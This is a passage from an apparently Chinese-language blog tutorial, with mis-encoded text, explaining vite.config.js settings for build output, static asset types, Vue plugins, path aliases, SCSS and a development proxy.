<li><code>loadEnv</code> ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç¯å¢ƒæ¨¡å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç¯å¢ƒé…ç½®æ–‡ä»¶ç›®å½•ï¼Œä¼šè‡ªåŠ¨åŠ è½½è¯¥ç›®å½•ä¸‹ <code>.env.${mode}</code> æ ¼å¼çš„æ–‡ä»¶ã€‚</li>
<li>ç”Ÿäº§ç¯å¢ƒæ„å»ºå‰é€šè¿‡ <code>rimraf</code> æ¸…ç†æ—§çš„ <code>dist</code> ç›®å½•ï¼Œé¿å…æ—§èµ„æºæ®‹ç•™å¯¼è‡´éƒ¨ç½²é—®é¢˜ã€‚</li>
<li>å…¬å…±è·¯å¾„ <code>base</code> ç”¨äºé…ç½®æ‰“åŒ…åèµ„æºçš„æ ¹è·¯å¾„ï¼Œç”Ÿäº§ç¯å¢ƒé…ç½® CDN åœ°å€ï¼Œæµ‹è¯•ç¯å¢ƒé…ç½®æœ¬åœ°å­è·¯å¾„ï¼Œè§£å†³èµ„æº 404 é—®é¢˜ã€‚</li>
</ol>
<h3 data-id="heading-8">æ¨¡å—äºŒï¼šç”Ÿäº§æ„å»ºé…ç½®ï¼ˆbuildï¼‰</h3>
<p>è¯¥æ¨¡å—æ˜¯ vite.config.js çš„æ ¸å¿ƒä¹‹ä¸€ï¼Œç”¨äºå®šä¹‰ç”Ÿäº§ç¯å¢ƒæ‰“åŒ…çš„è¾“å‡ºè§„åˆ™ã€ä¼˜åŒ–ç­–ç•¥ï¼Œæ‰€æœ‰é…ç½®å‡æ”¾åœ¨ <code>build</code> å­—æ®µä¸‹ï¼Œä¾æ‰˜ Rollup å®ç°æ‰“åŒ…èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-9">é…ç½®é€»è¾‘</h4>
<ol>
<li>é…ç½®å·®å¼‚åŒ–è¾“å‡ºç›®å½•ï¼Œå®ç°ç”Ÿäº§ç¯å¢ƒç‰ˆæœ¬éš”ç¦»ã€‚</li>
<li>å¼€å¯è¾“å‡ºç›®å½•è‡ªåŠ¨æ¸…ç©ºï¼Œé¿å…æ‰‹åŠ¨æ¸…ç†é—æ¼ã€‚</li>
<li>é…ç½® Rollup æ‰“åŒ…å‚æ•°ï¼ŒåŒ…æ‹¬å…¥å£ã€ä»£ç å—è¾“å‡ºè§„åˆ™ã€é™æ€èµ„æºåˆ†ç±»è¾“å‡ºè§„åˆ™ã€‚</li>
<li>é…ç½®æ’ä»¶å®ç°æ‰“åŒ…åèµ„æºè‡ªåŠ¨æ‹·è´ï¼Œæ»¡è¶³æœ¬åœ°éƒ¨ç½²éœ€æ±‚ã€‚</li>
<li>é…ç½® SourceMap ç”Ÿæˆè§„åˆ™ï¼Œå…¼é¡¾è°ƒè¯•ä¸å®‰å…¨ã€‚</li>
</ol>
<h4 data-id="heading-10">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// å…¶ä»–é…ç½®...</span>
  <span class="hljs-attr">build</span>: {
    <span class="hljs-comment">// 1. å·®å¼‚åŒ–è¾“å‡ºç›®å½•ï¼šç”Ÿäº§ç¯å¢ƒå¸¦æ—¶é—´æˆ³ï¼Œæµ‹è¯•ç¯å¢ƒç®€æ˜“ç›®å½•</span>
    <span class="hljs-attr">outDir</span>: mode === <span class="hljs-string">'production'</span> ? <span class="hljs-string">`dist/cdn/<span class="hljs-subst">${fileDateDir}</span>`</span> : <span class="hljs-string">'dist'</span>,
    <span class="hljs-comment">// 2. æ‰“åŒ…å‰è‡ªåŠ¨æ¸…ç©º outDir å¯¹åº”çš„ç›®å½•</span>
    <span class="hljs-attr">emptyOutDir</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-comment">// 3. æ˜¯å¦ç”Ÿæˆ SourceMapï¼šå¼€å‘ç¯å¢ƒç”Ÿæˆï¼Œç”Ÿäº§ç¯å¢ƒå…³é—­ï¼ˆå®‰å…¨+å‡å°ä½“ç§¯ï¼‰</span>
    <span class="hljs-attr">sourcemap</span>: mode === <span class="hljs-string">'development'</span>,
    <span class="hljs-comment">// 4. Rollup æ‰“åŒ…è¯¦ç»†é…ç½®</span>
    <span class="hljs-attr">rollupOptions</span>: {
      <span class="hljs-comment">// é…ç½®æ‰“åŒ…å…¥å£ï¼šæŒ‡å®š index.html ä½œä¸ºå…¥å£æ–‡ä»¶</span>
      <span class="hljs-attr">input</span>: {
        <span class="hljs-attr">main</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'index.html'</span>)
      },
      <span class="hljs-comment">// é…ç½®è¾“å‡ºè§„åˆ™</span>
      <span class="hljs-attr">output</span>: {
        <span class="hljs-comment">// å…¥å£ä»£ç å—è¾“å‡ºè§„åˆ™ï¼šè¾“å‡ºåˆ° assets/js ç›®å½•ï¼Œæ·»åŠ  hash åç¼€</span>
        <span class="hljs-attr">entryFileNames</span>: <span class="hljs-string">'assets/js/[name]-[hash].js'</span>,
        <span class="hljs-comment">// å…¬å…±/å¼‚æ­¥ä»£ç å—è¾“å‡ºè§„åˆ™ï¼šä¸å…¥å£ä»£ç å—ç»Ÿä¸€ç›®å½•</span>
        <span class="hljs-attr">chunkFileNames</span>: <span class="hljs-string">'assets/js/[name]-[hash].js'</span>,
        <span class="hljs-comment">// é™æ€èµ„æºåˆ†ç±»è¾“å‡ºè§„åˆ™ï¼šæŒ‰æ–‡ä»¶ç±»å‹æ‹†åˆ†ç›®å½•</span>
        <span class="hljs-attr">assetFileNames</span>: <span class="hljs-function">(<span class="hljs-params">{ name }</span>) =&gt;</span> {
          <span class="hljs-keyword">if</span> (name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.css'</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/css/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-keyword">if</span> (name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.html'</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/html/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-keyword">if</span> (
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.png'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.jpg'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.jpeg'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.svg'</span>)
          ) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/img/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-keyword">if</span> (
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.xls'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.xlsx'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.csv'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.pdf'</span>)
          ) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/files/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-keyword">if</span> (
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.ttf'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.eot'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.woff'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.otf'</span>)
          ) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/fonts/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-comment">// é»˜è®¤è¾“å‡ºç›®å½•</span>
          <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/[name]-[hash][extname]'</span>;
        }
      },
      <span class="hljs-comment">// 5. Rollup æ’ä»¶é…ç½®ï¼šæ‰“åŒ…åèµ„æºæ‹·è´</span>
      <span class="hljs-attr">plugins</span>: [
        <span class="hljs-title function_">copy</span>({
          <span class="hljs-attr">targets</span>: [
            {
              <span class="hljs-attr">src</span>: [
                <span class="hljs-string">`dist/cdn/<span class="hljs-subst">${fileDateDir}</span>/json`</span>,
                <span class="hljs-string">`dist/cdn/<span class="hljs-subst">${fileDateDir}</span>/locales`</span>,
                <span class="hljs-string">`dist/cdn/<span class="hljs-subst">${fileDateDir}</span>/index.html`</span>
              ],
              <span class="hljs-attr">dest</span>: <span class="hljs-string">'dist/local'</span>
            }
          ],
          <span class="hljs-comment">// æ‰“åŒ…å®Œæˆåæ‰§è¡Œæ‹·è´</span>
          <span class="hljs-attr">hook</span>: <span class="hljs-string">'writeBundle'</span>,
          <span class="hljs-comment">// æ‰å¹³åŒ–ç›®å½•ç»“æ„ï¼Œé¿å…å¤šçº§åµŒå¥—</span>
          <span class="hljs-attr">flatten</span>: <span class="hljs-literal">true</span>
        })
      ]
    }
  },
});
</code></pre>
<h4 data-id="heading-11">é…ç½®è¯´æ˜</h4>
<ol>
<li><code>outDir</code> å®šä¹‰æ‰“åŒ…è¾“å‡ºç›®å½•ï¼Œç”Ÿäº§ç¯å¢ƒä½¿ç”¨å¸¦æ—¶é—´æˆ³çš„ç›®å½•åï¼Œå®ç°ç‰ˆæœ¬éš”ç¦»ï¼Œé˜²æ­¢æ—§èµ„æºç¼“å­˜å¯¼è‡´çº¿ä¸Šé—®é¢˜ã€‚</li>
<li>Vite ç”Ÿäº§æ‰“åŒ…ï¼ˆ<code>vite build</code>ï¼‰æ—¶ï¼Œé»˜è®¤ä¼šç»™<strong>é™æ€èµ„æºæ–‡ä»¶</strong>ï¼ˆCSS/å›¾ç‰‡/å­—ä½“ç­‰ï¼‰æ·»åŠ å†…å®¹å“ˆå¸Œï¼Œè§„åˆ™æ˜¯ï¼šæ–‡ä»¶åæ ¼å¼ï¼š<code>[name].[hash].[ext]</code>ï¼ˆæ¯”å¦‚ <code>app.8a3b2.js</code>ï¼‰ã€‚å¯¹äºæ™®é€š JS æ–‡ä»¶ï¼Œéœ€é€šè¿‡é…ç½® <code>entryFileNames</code>/<code>chunkFileNames</code> æ‰‹åŠ¨æ·»åŠ  hashã€‚</li>
<li><code>assetFileNames</code> å®ç°é™æ€èµ„æºåˆ†ç±»ï¼Œå°† CSSã€å›¾ç‰‡ã€åŠå…¬æ–‡ä»¶ã€å­—ä½“åˆ†åˆ«æ”¾å…¥å¯¹åº”ç›®å½•ï¼Œä¾¿äºéƒ¨ç½²å’Œè¿ç»´æ’æŸ¥ã€‚</li>
<li><code>rollupOptions.plugins</code> ä¸­é…ç½® <code>rollup-plugin-copy</code>ï¼Œåœ¨æ‰“åŒ…å®Œæˆåå°†æ ¸å¿ƒèµ„æºæ‹·è´åˆ° <code>dist/local</code>ï¼Œæ»¡è¶³æœ¬åœ°æµ‹è¯•éƒ¨ç½²éœ€æ±‚ã€‚</li>
</ol>
<h3 data-id="heading-12">æ¨¡å—ä¸‰ï¼šé™æ€èµ„æºæ‰©å±•é…ç½®ï¼ˆassetsIncludeï¼‰</h3>
<p>Vite æœ‰é»˜è®¤æ”¯æŒçš„é™æ€èµ„æºç±»å‹ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šæ ¼å¼çš„æ–‡ä»¶ï¼ˆå¦‚ xlsxã€pdfï¼‰ï¼Œéœ€è¦é€šè¿‡ <code>assetsInclude</code> æ‰©å±•è¯†åˆ«ï¼Œç¡®ä¿æ‰“åŒ…æ—¶èƒ½æ­£ç¡®å¤„ç†è¿™äº›èµ„æºã€‚</p>
<h4 data-id="heading-13">é…ç½®é€»è¾‘</h4>
<ol>
<li>ä»¥æ•°ç»„å½¢å¼åˆ—å‡ºéœ€è¦æ‰©å±•çš„é™æ€èµ„æºåç¼€ã€‚</li>
<li>é…ç½®åœ¨é¡¶å±‚å­—æ®µä¸­ï¼Œå…¨å±€ç”Ÿæ•ˆã€‚</li>
</ol>
<h4 data-id="heading-14">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// å…¶ä»–é…ç½®...</span>
  <span class="hljs-comment">// æ‰©å±•é™æ€èµ„æºç±»å‹è¯†åˆ«</span>
  <span class="hljs-attr">assetsInclude</span>: [
    <span class="hljs-string">'**/*.xlsx'</span>,
    <span class="hljs-string">'**/*.xls'</span>,
    <span class="hljs-string">'**/*.csv'</span>,
    <span class="hljs-string">'**/*.pdf'</span>,
    <span class="hljs-string">'**/*.png'</span>,
    <span class="hljs-string">'**/*.jpg'</span>,
    <span class="hljs-string">'**/*.svg'</span>
  ],
});
</code></pre>
<h4 data-id="heading-15">é…ç½®è¯´æ˜</h4>
<ol>
<li>é€šé…ç¬¦ <code>**/</code> è¡¨ç¤ºåŒ¹é…æ‰€æœ‰ç›®å½•ä¸‹çš„å¯¹åº”æ–‡ä»¶ã€‚</li>
<li>é…ç½®åï¼Œè¿™äº›ç‰¹æ®Šæ ¼å¼æ–‡ä»¶å¯ä»¥é€šè¿‡ <code>import</code> å¼•å…¥ï¼Œæ‰“åŒ…æ—¶ä¼šæŒ‰ç…§ <code>build.rollupOptions.output</code> ä¸­çš„è§„åˆ™è¾“å‡ºåˆ°å¯¹åº”ç›®å½•ã€‚</li>
</ol>
<h3 data-id="heading-16">æ¨¡å—å››ï¼šæ’ä»¶é…ç½®ï¼ˆpluginsï¼‰</h3>
<p>æ’ä»¶æ˜¯ Vite æ‰©å±•åŠŸèƒ½çš„æ ¸å¿ƒè½½ä½“ï¼Œé€šè¿‡é…ç½®ä¸åŒæ’ä»¶ï¼Œå¯ä»¥å®ç° Vue è§£æã€JSX æ”¯æŒã€HTML ä¼˜åŒ–ç­‰åŠŸèƒ½ï¼Œæ‰€æœ‰æ’ä»¶é…ç½®åœ¨ <code>plugins</code> æ•°ç»„ä¸­ï¼ŒæŒ‰éœ€æ±‚å¼•å…¥å¹¶åˆå§‹åŒ–ã€‚</p>
<h4 data-id="heading-17">é…ç½®é€»è¾‘</h4>
<ol>
<li>å®‰è£…æ‰€éœ€æ’ä»¶ï¼ˆå¦‚ <code>@vitejs/plugin-vue</code>ï¼‰ã€‚</li>
<li>åœ¨é…ç½®æ–‡ä»¶ä¸­å¯¼å…¥æ’ä»¶ã€‚</li>
<li>åœ¨ <code>plugins</code> æ•°ç»„ä¸­åˆå§‹åŒ–æ’ä»¶ï¼Œä¼ å…¥å¿…è¦çš„é…ç½®å‚æ•°ã€‚</li>
</ol>
<h4 data-id="heading-18">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>;
<span class="hljs-keyword">import</span> vueJsx <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue-jsx'</span>;
<span class="hljs-keyword">import</span> { createHtmlPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-html'</span>;
<span class="hljs-keyword">import</span> { createSvgIconsPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-svg-icons'</span>;

<span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// å…¶ä»–é…ç½®...</span>
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-comment">// 1. è§£æ Vue å•æ–‡ä»¶ç»„ä»¶ï¼ˆ.vueï¼‰ï¼ŒVue é¡¹ç›®å¿…å¤‡</span>
    <span class="hljs-title function_">vue</span>({
      <span class="hljs-attr">template</span>: {
        <span class="hljs-attr">transformAssetUrls</span>: {
          <span class="hljs-attr">video</span>: [<span class="hljs-string">'src'</span>, <span class="hljs-string">'poster'</span>],
          <span class="hljs-attr">source</span>: [<span class="hljs-string">'src'</span>],
          <span class="hljs-attr">img</span>: [<span class="hljs-string">'src'</span>],
          <span class="hljs-attr">image</span>: [<span class="hljs-string">'xlink:href'</span>, <span class="hljs-string">'href'</span>],
          <span class="hljs-attr">use</span>: [<span class="hljs-string">'xlink:href'</span>, <span class="hljs-string">'href'</span>],
          <span class="hljs-attr">a</span>: [<span class="hljs-string">'downloadHref'</span>]
        }
      }
    }),
    <span class="hljs-comment">// 2. æ”¯æŒ Vue JSX/TSX è¯­æ³•è§£æ</span>
    <span class="hljs-title function_">vueJsx</span>({}),
    <span class="hljs-comment">// 3. HTML ä¼˜åŒ–æ’ä»¶ï¼šå‹ç¼© HTMLã€åŠ¨æ€æ³¨å…¥æ•°æ®</span>
    <span class="hljs-title function_">createHtmlPlugin</span>({
      <span class="hljs-attr">minify</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">entry</span>: <span class="hljs-string">'src/main.js'</span>,
      <span class="hljs-attr">inject</span>: {
        <span class="hljs-attr">data</span>: {}
      }
    }),
    <span class="hljs-comment">// 4. SVG å›¾æ ‡ç®¡ç†æ’ä»¶ï¼šç”Ÿæˆ SVG Spriteï¼Œå®ç°å›¾æ ‡å¤ç”¨</span>
    <span class="hljs-title function_">createSvgIconsPlugin</span>({
      <span class="hljs-attr">iconDirs</span>: [path.<span class="hljs-title function_">resolve</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'src/assets/icons'</span>)],
      <span class="hljs-attr">symbolId</span>: <span class="hljs-string">'g-icon-[name]'</span>
    })
  ],
});
</code></pre>
<h4 data-id="heading-19">é…ç½®è¯´æ˜</h4>
<ol>
<li><code>@vitejs/plugin-vue</code>ï¼šVue é¡¹ç›®æ ¸å¿ƒæ’ä»¶ï¼Œç”¨äºè§£æ <code>.vue</code> å•æ–‡ä»¶ç»„ä»¶ï¼Œ<code>transformAssetUrls</code> é…ç½®ç”¨äºä¿®æ­£æ¨¡æ¿ä¸­èµ„æºçš„è·¯å¾„è§£æã€‚</li>
<li><code>@vitejs/plugin-vue-jsx</code>ï¼šæ”¯æŒ JSX/TSX è¯­æ³•ï¼Œæ»¡è¶³ä¸ªæ€§åŒ–ç¼–ç éœ€æ±‚ï¼Œæ— éœ€é¢å¤–é…ç½®å³å¯ä½¿ç”¨ã€‚</li>
<li><code>vite-plugin-html</code>ï¼šç”Ÿäº§ç¯å¢ƒè‡ªåŠ¨å‹ç¼© HTMLï¼Œæ”¯æŒåŠ¨æ€æ³¨å…¥æ•°æ®åˆ° HTML ä¸­ï¼Œæå‡é¡µé¢åŠ è½½æ€§èƒ½ã€‚</li>
<li><code>vite-plugin-svg-icons</code>ï¼šå°†æŒ‡å®šç›®å½•ä¸‹çš„ SVG å›¾æ ‡ç”Ÿæˆ Spriteï¼Œåœ¨é¡¹ç›®ä¸­å¯é€šè¿‡ <code>&lt;svg&gt;&lt;use xlink:href="#g-icon-xxx"&gt;&lt;/use&gt;&lt;/svg&gt;</code> å¤ç”¨ï¼Œé¿å…å›¾æ ‡é‡å¤å¼•å…¥ã€‚</li>
</ol>
<h3 data-id="heading-20">æ¨¡å—äº”ï¼šè·¯å¾„åˆ«åé…ç½®ï¼ˆresolve.aliasï¼‰</h3>
<p>åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œç›¸å¯¹è·¯å¾„ï¼ˆå¦‚ <code>../../../src/components/Modal</code>ï¼‰ä¼šé™ä½å¼€å‘æ•ˆç‡å’Œä»£ç å¯ç»´æŠ¤æ€§ï¼Œé€šè¿‡ <code>resolve.alias</code> é…ç½®è·¯å¾„åˆ«åï¼Œå¯ç®€åŒ–æ¨¡å—å¼•å…¥è·¯å¾„ã€‚</p>
<h4 data-id="heading-21">é…ç½®é€»è¾‘</h4>
<ol>
<li>å€ŸåŠ© <code>path.resolve</code> è§£æç»å¯¹è·¯å¾„ã€‚</li>
<li>åœ¨ <code>resolve.alias</code> ä¸­å®šä¹‰åˆ«åä¸å¯¹åº”ç›®å½•çš„æ˜ å°„å…³ç³»ã€‚</li>
</ol>
<h4 data-id="heading-22">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// å…¶ä»–é…ç½®...</span>
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-comment">// ä¼˜å…ˆè§£æ browser å­—æ®µå’Œ module å­—æ®µ</span>
    <span class="hljs-attr">mainFields</span>: [<span class="hljs-string">'browser'</span>, <span class="hljs-string">'module'</span>],
    <span class="hljs-comment">// è·¯å¾„åˆ«åé…ç½®</span>
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'./src'</span>), <span class="hljs-comment">// æ˜ å°„ src ç›®å½•</span>
      <span class="hljs-string">'@LC'</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'../lib-components/src'</span>), <span class="hljs-comment">// æ˜ å°„å¤–éƒ¨ç»„ä»¶åº“ç›®å½•</span>
      <span class="hljs-string">'#'</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'./types'</span>), <span class="hljs-comment">// æ˜ å°„ç±»å‹å®šä¹‰ç›®å½•</span>
      <span class="hljs-string">'td-print'</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'./node_modules/td-print/index.js'</span>) <span class="hljs-comment">// æ˜ å°„ç‰¹å®šæ¨¡å—</span>
    }
  },
});
</code></pre>
<h4 data-id="heading-23">é…ç½®è¯´æ˜</h4>
<ol>
<li>é…ç½®åï¼Œå¯ä½¿ç”¨ <code>@/components/Modal</code> æ›¿ä»£ <code>../../../src/components/Modal</code>ï¼Œç®€åŒ–è·¯å¾„ä¹¦å†™ã€‚</li>
<li>åˆ«åä¸ä»…æ”¯æŒç›®å½•æ˜ å°„ï¼Œè¿˜æ”¯æŒå•ä¸ªæ–‡ä»¶æ˜ å°„ï¼ˆå¦‚ <code>td-print</code>ï¼‰ï¼š
<ul>
<li><code>td-print</code> æ˜¯è‡ªå®šä¹‰æ¨¡å—åˆ«åï¼Œå¯¹åº”é¡¹ç›®ä¸­ <code>./node_modules/td-print/index.js</code>ï¼ˆå‰ç«¯æ‰“å°ç›¸å…³ç¬¬ä¸‰æ–¹åº“ï¼‰ï¼›</li>
<li>ä¸é…ç½®åˆ«åæ—¶éœ€å†™å®Œæ•´è·¯å¾„ <code>import print from './node_modules/td-print/index.js'</code>ï¼Œé…ç½®åå¯ç›´æ¥ <code>import print from 'td-print'</code>ï¼Œç®€åŒ–å¯¼å…¥ã€æå‡å¯è¯»æ€§ã€‚</li>
</ul>
</li>
<li><code>path.resolve</code> ç”¨äºç”Ÿæˆç»å¯¹è·¯å¾„ï¼Œé¿å…ä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„è·¯å¾„åˆ†éš”ç¬¦é—®é¢˜ã€‚</li>
<li>è¡¥å……ï¼šè·¯å¾„åˆ«åéœ€é…åˆç¼–è¾‘å™¨é…ç½®ï¼ˆå¦‚ <code>tsconfig.json</code>/<code>jsconfig.json</code> çš„ <code>compilerOptions.paths</code>ï¼‰ï¼Œå®ç°ä»£ç æç¤ºå’Œè·³è½¬ã€‚</li>
</ol>
<h3 data-id="heading-24">æ¨¡å—å…­ï¼šCSS é¢„å¤„ç†å™¨é…ç½®ï¼ˆcssï¼‰</h3>
<p>Vite å†…ç½®æ”¯æŒ SCSSã€Less ç­‰ CSS é¢„å¤„ç†å™¨ï¼Œåªéœ€å®‰è£…å¯¹åº”çš„ä¾èµ–ï¼Œå†é€šè¿‡ <code>css.preprocessorOptions</code> é…ç½®é¢„å¤„ç†å™¨å‚æ•°ï¼Œå³å¯æ­£å¸¸ä½¿ç”¨ã€‚</p>
<h4 data-id="heading-25">é…ç½®é€»è¾‘</h4>
<ol>
<li>å®‰è£… SCSS ä¾èµ–ï¼ˆ<code>sass</code>ï¼Œæ³¨æ„ä¸æ˜¯ <code>node-sass</code>ï¼‰ã€‚</li>
<li>åœ¨ <code>css.preprocessorOptions.scss</code> ä¸­é…ç½®ç¼–è¯‘å‚æ•°ã€æŠ‘åˆ¶å¼ƒç”¨è­¦å‘Šç­‰ã€‚</li>
</ol>
<h4 data-id="heading-26">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// å…¶ä»–é…ç½®...</span>
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: {
        <span class="hljs-comment">// ä½¿ç”¨ç°ä»£ç¼–è¯‘å™¨ APIï¼Œæå‡å…¼å®¹æ€§å’Œç¼–è¯‘æ€§èƒ½</span>
        <span class="hljs-attr">api</span>: <span class="hljs-string">'modern-compiler'</span>,
        <span class="hljs-comment">// æŠ‘åˆ¶ import ç›¸å…³çš„å¼ƒç”¨è­¦å‘Šï¼Œä¿æŒæ„å»ºæ—¥å¿—æ•´æ´</span>
        <span class="hljs-attr">silenceDeprecations</span>: [<span class="hljs-string">'import'</span>]
      }
    }
  },
});
</code></pre>
<h4 data-id="heading-27">é…ç½®è¯´æ˜</h4>
<ol>
<li>ä½¿ç”¨ SCSS å‰éœ€å®‰è£…ä¾èµ–ï¼š<code>npm install sass --save-dev</code>ã€‚</li>
<li><code>api: 'modern-compiler'</code> æŒ‡å®šä½¿ç”¨ç°ä»£ç¼–è¯‘å™¨ APIï¼Œæ›¿ä»£æ—§çš„ <code>node-sass</code> ç¼–è¯‘å™¨ï¼Œæå‡ç¼–è¯‘é€Ÿåº¦å’Œå…¼å®¹æ€§ã€‚</li>
<li><code>silenceDeprecations</code> ç”¨äºæŠ‘åˆ¶ä¸å¿…è¦çš„å¼ƒç”¨è­¦å‘Šï¼Œé¿å…æ„å»ºæ—¥å¿—è¢«å†—ä½™ä¿¡æ¯è¦†ç›–ã€‚</li>
</ol>
<h3 data-id="heading-28">æ¨¡å—ä¸ƒï¼šæœ¬åœ°å¼€å‘æœåŠ¡å™¨é…ç½®ï¼ˆserverï¼‰</h3>
<p>è¯¥æ¨¡å—ç”¨äºé…ç½®æœ¬åœ°å¼€å‘æœåŠ¡å™¨çš„ç›¸å…³å‚æ•°ï¼ŒåŒ…æ‹¬ç«¯å£ã€è·¨åŸŸä»£ç†ã€ä¸»æœºè®¿é—®æƒé™ç­‰ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡ <code>proxy</code> é…ç½®è§£å†³æœ¬åœ°å¼€å‘çš„æ¥å£è·¨åŸŸé—®é¢˜ã€‚</p>
<h4 data-id="heading-29">é…ç½®é€»è¾‘</h4>
<ol>
<li>é…ç½®æœåŠ¡å™¨ç«¯å£å’Œä¸»æœºè®¿é—®æƒé™ã€‚</li>
<li>é€šè¿‡ <code>proxy</code> é…ç½®æ¥å£è½¬å‘è§„åˆ™ï¼Œå°†å‰ç«¯è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡ã€‚</li>
<li>é…ç½® <code>changeOrigin</code> å®ç°è·¨åŸŸæ¨¡æ‹Ÿï¼Œé…ç½® <code>rewrite</code> ä¿®æ­£è¯·æ±‚è·¯å¾„ã€‚</li>
</ol>
<h4 data-id="heading-30">ä»£ç å®ç°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// å…¶ä»–é…ç½®...</span>
  <span class="hljs-attr">server</span>: {
    <span class="hljs-comment">// é…ç½®æœ¬åœ°å¼€å‘æœåŠ¡å™¨ç«¯å£</span>
    <span class="hljs-attr">port</span>: <span class="hljs-number">8387</span>,
    <span class="hljs-comment">// å…è®¸å¤–éƒ¨è®¾å¤‡è®¿é—®ï¼ˆå¦‚æ‰‹æœºã€åŒä¸€å±€åŸŸç½‘çš„å…¶ä»–ç”µè„‘ï¼‰</span>
    <span class="hljs-attr">host</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-comment">// è·¨åŸŸä»£ç†é…ç½®</span>
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-comment">// åŒ¹é…ä»¥ /charm å¼€å¤´çš„è¯·æ±‚</span>
      <span class="hljs-string">'/charm'</span>: {
        <span class="hljs-comment">// åç«¯æœåŠ¡ç›®æ ‡åœ°å€</span>
        <span class="hljs-attr">target</span>: <span class="hljs-string">'http://10.1.11.11:58***/'</span>,
        <span class="hljs-comment">// å¼€å¯è·¨åŸŸæ¨¡æ‹Ÿï¼šä¿®æ”¹è¯·æ±‚å¤´ä¸­çš„ Origin ä¸ºç›®æ ‡åœ°å€</span>
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-comment">// è·¯å¾„é‡å†™ï¼šæ­¤å¤„ä¿æŒåŸè·¯å¾„ä¸å˜ï¼Œå¯æ ¹æ®éœ€æ±‚ä¿®æ”¹</span>
        <span class="hljs-attr">rewrite</span>: <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^\/charm/</span>, <span class="hljs-string">'/charm'</span>)
      },
      <span class="hljs-comment">// å¯é…ç½®å¤šä¸ªä»£ç†è§„åˆ™</span>
      <span class="hljs-string">'/g-filestore'</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-string">'http://10.5.11.11:8***/'</span>,
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>
      }
    }
  },
});
</code></pre>
<h4 data-id="heading-31">é…ç½®è¯´æ˜</h4>
<ol>
